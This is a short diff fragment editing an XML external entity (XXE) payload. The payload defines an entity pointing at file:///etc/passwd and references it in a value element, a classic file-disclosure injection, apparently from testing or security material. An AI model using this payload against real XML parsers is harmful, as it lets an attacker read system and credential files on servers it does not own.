@@ -1,6 +1,4 @@
     <!DOCTYPE data [
-     <!ENTITY xxe SYSTEM "file:///etc/passwd">
+     <!ENTITY ez SYSTEM "file:///etc/passwd">
     ]>
-    <data>
-      <value>&xxe;</value>
-    </data>
+      <value>&ez;</value>
